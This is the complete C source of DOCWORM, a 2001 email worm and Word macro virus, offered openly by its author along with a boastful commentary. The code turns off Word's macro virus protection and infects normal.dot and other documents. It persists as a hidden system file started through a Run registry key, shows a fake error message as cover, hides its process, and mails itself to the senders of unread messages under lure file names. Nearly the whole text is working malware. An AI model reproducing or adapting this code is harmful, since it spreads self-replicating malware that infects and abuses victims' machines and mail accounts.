   /*
      DOCWORM
      by Bumblebee

      Copyright (c) 2001 Bumblebee <bbbee@mailcity.com>
      (aka I-Worm.Bumdoc huehehe, fuck off avp gays)

      THIS IS THE SOURCE CODE OF AN I-WORM. THE AUTHOR IS NOT
      RESPONSABILE OF ANY DAMAGES THAT MAY OCCUR DUE  TO  ITS
      BUILD AND UPON EXECUTION.

      I was bored and had to study and work and... well i did it in
      half a day.

      Peeps into unread mails to get addresses to send, kinda like
      Plage 2000 does but this time is not an endless loop. Due to
      this i check unread mails once, and i don't mark them coz until
      next boot i won't check mails again. Moreover i fix the damn
      bug i put in plage that makes it flood certain e-mail clients :)

      It uses the same trick of BRSHWORM to generate an stealth-error
      message: tries to load a fake dll and with the FormatMessage
      API shows the user the system cannot find a required component
      to run the app. The nice adventage of this fake message is
      it will be appear in the user's leng, and in fact is a genuine
      win error message ;)

      I've used C random stuff in all the worm, so all the files used
      by the worm (not including the macro dropper and the install
      lock file) have a random name.

      This is a little worm/virus that drops itself into normal.dot
      via a vbs script. The installed macros are full working macro virus
      that will infect other documents and drop and install the worm
      when a new normal.dot is infected from a document.

      The macro spawn system is quite the same i used in Lil'Devil, but this
      time the macro virus is more powerful and the encoded dropper is quite
      more optimized, but i'm still not a macro coder :/
      I've used fixed length in the macro encoding stuff. Due to this if the
      worm is greather this hardcoded size the encoded dropper in the macros
      will be wrong. So simbiosis alike stuff won't work fine with this
      worm, sorry :)

      As you can see the source is very small. The binary this time is
      8964 bytes. BRSHWORM has a little binary too. This time i linked it
      aganist msvcrt.dll instead crtdll.dll i used in BRSHWORM. Seems second
      library will be deprecated in the future so now i'm going to use
      msvcrt (even 1st win95 version has not). Why to carry with the run-time
      of your compiler when m$ has those installed for us to use them?
      And don't care the compiler you're using, i've done those two worms
      with an old BC++ and i've linked them with the so powerful ALINK.

      Here you have a very simple and effective i-worm to kill my spare
      (and no so spare) time.

      I hope you like it even it has not the innovative feel than BRSHWORM
      (aka i-worm.funnypics) has. The fact it's able to jump over word makes
      it has two ways to spread, thus less limited than BRSHWORM. I think
      it's possible to see DOCWORM itw... not BRSHWORM.

      the way of the bee

   */

   #include<windows.h>
   #include<stdio.h>
   #include<mapi.h>
   #include<mem.h>

   char copyright[]="\n[ This is DOCWORM by Bumblebee ]\n";

   char daemonFile[]="\\xxxxxxxx.exe";

   char vbsFile[]="c:\\xxxxxxxx.vbs";
   char *vbs[]= {
   "' This is part of the DOCWORM Project\n"
   "' the way of the bee\n"
   "On Error Resume Next\n"
   "set w=createobject(\"word.application\")\n"
   "w.options.virusprotection=0\n"
   "w.options.savenormalprompt=0\n"
   "w.options.confirmconversions=0\n"
   "if w.normaltemplate.vbproject.vbcomponents(1).name<>\"DOCWORM\" then\n"
   "w.normaltemplate.vbproject.vbcomponents(1).codemodule."
   "addfromfile(\"",
   "\")\n"
   "w.normaltemplate.vbproject.vbcomponents(1).name=\"DOCWORM\"\n"
   "end if\n"
   "w.application.quit\n"
   "wscript.quit\n"
   };

   char macrosFile[]="c:\\xxxxxxxx.sys";
   char macros[]=

   /* that's main sub of macro virus. It infects at document open. */
   /* Case it infects normal.dot it drops the worm and execs it with */
   /* install mode */

   "Private Sub Document_Open()\n"
   "' This is part of the DOCWORM Project\n"
   "' the way of the bee\n"
   "On Error Resume Next\n"
   "Set ad = ActiveDocument.VBProject.VBComponents(1)\n"
   "Set no = NormalTemplate.VBProject.VBComponents(1)\n"
   "Set op = Options\n"
   "op.VirusProtection = 0\n"
   "op.ConfirmConversions = 0\n"
   "op.SaveNormalPrompt = 0\n"
   "If no.Name <> \"DOCWORM\" Then\n"
   "no.Name = \"DOCWORM\"\n"
   "install ad, no\n"
   "drop\n"
   "bumblespawn=shell(\"c:\\spawn.exe /i\",vbnormalfocus)\n"
   "setattr (\"c:\\spawn.exe\"), 6\n"
   "End If\n"
   "If ad.Name <> \"DOCWORM\" Then\n"
   "ad.Name = \"DOCWORM\"\n"
   "install no, ad\n"
   "ActiveDocument.Save\n"
   "End If\n"
   "End Sub\n\n"

   /* this is sub is neat, it cleans all macros at destination item */
   /* before add our lovely virus :) Let's say it's hostile to other */
   /* macro virus hehehe */

   "Private Sub install(src, dst)\n"
   "Set odst = dst.CodeModule\n"
   "Set osrc = src.CodeModule\n"
   "odst.DeleteLines 1, odst.CountOfLines\n"
   "odst.InsertLines 1, osrc.Lines(1, osrc.CountOfLines)\n"
   "End Sub\n\n"

   /* this damn stealth sometimes works, and sometimes not... shit of */
   /* macros. The idea is to hang word (in fact it crashes at vbaxx.dll) */
   /* when tools>macro or tools>vba editor are called. */

   "private sub ToolsMacro()\n"
   "ViewVBCode\n"
   "end sub\n"
   "\n"
   "private sub ViewVBCode()\n"
   "ToolsMacro\n"
   "end sub\n";

   #define DEFAULT         0
   #define QUIET           1
   #define INSTALL         2
   #define WORDSPAWN       4

   char filename[1024];

   #define WSIZE           8964

   typedef ULONG (PASCAL FAR *RSP)(ULONG, ULONG);

   typedef ULONG (PASCAL FAR *MSENDMAIL)(ULONG, ULONG, MapiMessage *, FLAGS, ULONG);
   typedef ULONG (PASCAL FAR *MLOGON)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
   typedef ULONG (PASCAL FAR *MLOGOFF)(LHANDLE, ULONG, FLAGS, ULONG);
   typedef ULONG (PASCAL FAR *MFINDNEXT)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
   typedef ULONG (PASCAL FAR *MREADMAIL)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
   typedef ULONG (PASCAL FAR *MFREEBUFFER)(LPVOID);

   void spawnMail(void);

   int
   main()
   {
     FILE *fd,*in;
     LPTSTR commandLine,ptr;
     long i,j,k,n,m;
     BYTE status;
     char buffer[1024];
     HKEY hkey;
     unsigned char *file;
     HMODULE k32;
     RSP RegSerPro;

     /* mmm, clean your fingerprints man */
     DeleteFile("c:\\spawn.exe");

     /*
           default: install, word spawn, stealth message

           /w      word spawn
           /i      install
           /q      quiet
     */
     status=DEFAULT;
     srand(GetTickCount());
     commandLine=GetCommandLine();
     if(commandLine) {
           for(ptr=commandLine;ptr[0]!='/' && ptr[1]!=0;ptr++);
           if(ptr[0]=='/' && ptr[1]!=0) {
                   switch(ptr[1]) {
                           default:
                           break;
                           case 'q':
                                   status=QUIET;
                           break;
                           case 'i':
                                   status=INSTALL;
                           break;
                           case 'w':
                                   status=WORDSPAWN;
                           break;
                   }
           }
     }

     if(!GetModuleFileName(NULL,filename,1024))
           return 0;

     /* infect normal.dot */
     if(status==WORDSPAWN || !status) {
           if(!GetWindowsDirectory(buffer,256))
                   return 0;

           /* use wininit.ini as lock file */
           strcat(buffer,"\\wininit.ini");
           fd=fopen(buffer,"rt");
           if(fd)
                   fclose(fd);
           else {
                   for(i=0;i<8;i++) {
                           vbsFile[i+3]='a'+(char)(26*rand()/RAND_MAX);
                           macrosFile[i+3]='a'+(char)(26*rand()/RAND_MAX);
                   }

                   fd=fopen(macrosFile,"wt");
                   if(!fd)
                           return 0;
                   fprintf(fd,"%s",macros);
                   fprintf(fd,"private sub drop()\n");
                   fprintf(fd,"open \"c:\\spawn.exe\" for binary as #1\n");

                   file=(unsigned char *)malloc(WSIZE);
                   if(!file)
                           return 0;
                   in=fopen(filename,"rb");
                   fread(file,1,WSIZE,in);
                   fclose(in);

                   for(i=0,n=0;i<(WSIZE/512)+1 && n<WSIZE;i++)
                           fprintf(fd,"d%i\n",i);
                   fprintf(fd,"close #1\nend sub\n");

                   for(i=0;i<(WSIZE/512)+1 && n<WSIZE;i++) {
                           fprintf(fd,"\nprivate sub d%i()\n",i);
                           for(j=0;j<8 && n<WSIZE;j++) {
                                   fprintf(fd,"b$=");
                                   for(k=0,m=0;k<64;k++,n++) {
                                           if(n==WSIZE-1)
                                                   k=63;
                                           /* optimize a bit */
                                           if((file[n]>'a'-1 && file[n]<'z'+1) ||
                                              (file[n]>'A'-1 && file[n]<'Z'+1) ||
                                              (file[n]>'0'-1 && file[n]<'9'+1)) {
                                                   if(!m) {
                                                           fprintf(fd,"\"%c",file[n]);
                                                           m++;
                                                   } else
                                                           fprintf(fd,"%c",file[n]);
                                           } else {
                                                   if(m) {
                                                           fprintf(fd,"\" & chr$(%i)",file[n]);
                                                           m=0;
                                                   } else
                                                           fprintf(fd,"chr$(%i)",file[n]);
                                           }
                                           if(k<63) {
                                                   if(!m)
                                                           fprintf(fd," & ");
                                           } else {
                                                   if(m) {
                                                           fprintf(fd,"\"\nput #1,,b$\n");
                                                           m=0;
                                                   } else
                                                           fprintf(fd,"\nput #1,,b$\n");
                                             }
                                   }
                          }
                          fprintf(fd,"end sub\n");
                   }
                   fclose(fd);
                   free(file);

                   fd=fopen(vbsFile,"wt");
                   if(!fd)
                           return 0;
                   fprintf(fd,"%s%s%s",vbs[0],macrosFile,vbs[1]);
                   fclose(fd);

                   if(ShellExecute(NULL,"open",vbsFile,NULL,NULL,SW_HIDE)<33) {
                           DeleteFile(macrosFile);
                           DeleteFile(vbsFile);
                   } else {
                           /* write inside wininit.ini stuff to erase those */
                           /* two files next boot time */
                           fd=fopen(buffer,"wt");
                           if(!fd)
                                   return 0;
                           fprintf(fd,"[rename]\n");
                           fprintf(fd,"NUL=%s\n",vbsFile);
                           fprintf(fd,"NUL=%s\n",macrosFile);
                           fclose(fd);
                   }
           }
     }

     /* installation stuff */
     if(status==INSTALL || !status) {

           if(!GetWindowsDirectory(buffer,256))
                   return 0;

           /* use this file as lock file */
           strcat(buffer,"\\binstall-lock.log");
           fd=fopen(buffer,"rt");

           if(fd)
                   fclose(fd);
           else {

           fd=fopen(buffer,"wt");
           fprintf(fd,"%s\n",buffer);
           fclose(fd);

           for(i=0;i<8;i++)
                   daemonFile[i+1]='a'+(char)(26*rand()/RAND_MAX);

           if(!GetWindowsDirectory(buffer,256))
                   return 0;

           strcat(buffer,daemonFile);
           if(CopyFile(filename,buffer,TRUE)) {
                   SetFileAttributes(buffer,FILE_ATTRIBUTE_READONLY |
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                   strcat(buffer," /q");
                   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
                           0,KEY_WRITE, &hkey)==ERROR_SUCCESS) {
                           daemonFile[strlen(daemonFile)-4]=0;
                           RegSetValueEx(hkey,daemonFile+1,0,REG_SZ,
                                   buffer,sizeof(buffer)+1);
                           RegCloseKey(hkey);
                   }
           }

           /* stealth message will appear only with installation with zero */
           /* flags: default */
           if(!status) {
                   LoadLibrary("fakedllfakedll");
                   FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,0,GetLastError(),
                           MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),&buffer,1024,NULL);
                   MessageBox(NULL,buffer,NULL,MB_OK|MB_ICONSTOP);
                   }
           }
           return 0;
     }

     /* at this point we are at quiet mode */
     /* try to hide current process as service */
     k32=GetModuleHandle("KERNEL32.DLL");
     if(k32) {
           RegSerPro=(RSP)GetProcAddress(k32,"RegisterServiceProcess");
           if(RegSerPro)
                   RegSerPro(0,1);
     }

     spawnMail();

     return 0;
   }

   /*
     Kinda rip from my BRSHWORM.
   */
   void
   spawnMail(void)
   {
     LHANDLE session;
     char mailto[256];
     HINSTANCE MAPIdll;
     MLOGON MLogon;
     MLOGOFF MLogoff;
     MSENDMAIL MSendMail;
     MFREEBUFFER MFree;
     MREADMAIL MReadMail;
     MFINDNEXT MFindNext;
     char messId[512];
     MapiMessage *mess;
     MapiFileDesc attachment={
           0,0,(ULONG)-1,NULL,NULL,NULL
     };
     MapiRecipDesc destination={
           0, MAPI_TO, NULL, NULL, 0, NULL
     };
     MapiMessage mbody={
           0,NULL,NULL,NULL,
           NULL,NULL,MAPI_RECEIPT_REQUESTED,NULL,1,
           NULL,1,NULL
     };
     char *filenames[]= {
     "setup.exe", "southpark.scr", "movie.exe", "divx.exe", "billy.scr",
     "santax.scr", "AllYouBaseBelongToUs.exe", "wazzup.scr", "fun2u.scr",
     "patch.exe", "pr0n.exe", "moreWindows.exe", "sillyPoint.exe",
     "hitByTheBill.exe", "hotHotHot.exe", "hurryUp.scr"
     };

     attachment.lpszPathName=filename;
     destination.lpszAddress=mailto;
     mbody.lpRecips=&destination;
     mbody.lpFiles=&attachment;

     /* wait for 5 minutes */
     Sleep(5*60*1000);

     /* get MAPI stuff */
     MAPIdll=LoadLibrary("MAPI32.DLL");
     if(!MAPIdll)
           return;

     MLogon=(MLOGON)GetProcAddress(MAPIdll, "MAPILogon");
     if(!MLogon)
           return;

     MLogoff=(MLOGOFF)GetProcAddress(MAPIdll, "MAPILogoff");
     if(!MLogoff)
           return;

     MSendMail=(MSENDMAIL)GetProcAddress(MAPIdll, "MAPISendMail");
     if(!MSendMail)
           return;

     MFindNext=(MFINDNEXT)GetProcAddress(MAPIdll, "MAPIFindNext");
     if(!MFindNext)
           return;


     MReadMail=(MREADMAIL)GetProcAddress(MAPIdll, "MAPIReadMail");
     if(!MReadMail)
           return;

     MFree=(MFREEBUFFER)GetProcAddress(MAPIdll, "MAPIFreeBuffer");
     if(!MFree)
           return;

     if((MLogon)(0, NULL, NULL, MAPI_USE_DEFAULT,
        0, &session)!=SUCCESS_SUCCESS) {
           Sleep(5000);
           FreeLibrary(MAPIdll);
           return;
     }

     /* scan all unreaded messages */
     messId[0]=0;
     while((MFindNext)(session,0,NULL,messId,MAPI_LONG_MSGID|MAPI_UNREAD_ONLY
                           ,0,messId)==SUCCESS_SUCCESS) {
           if((MReadMail)(session,0,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,
                   0,&mess)==SUCCESS_SUCCESS) {
                   strcpy(mailto,mess->lpOriginator->lpszAddress);
                   attachment.lpszFileName=filenames[(16*rand()/RAND_MAX)];
                   (MSendMail)(session,0,&mbody,0,0);
                   (MFree)(mess);
           }
     }

    Sleep(5000);
    (MLogoff)(session,0,0,0);

    Sleep(5000);
    FreeLibrary(MAPIdll);

    return;
   }
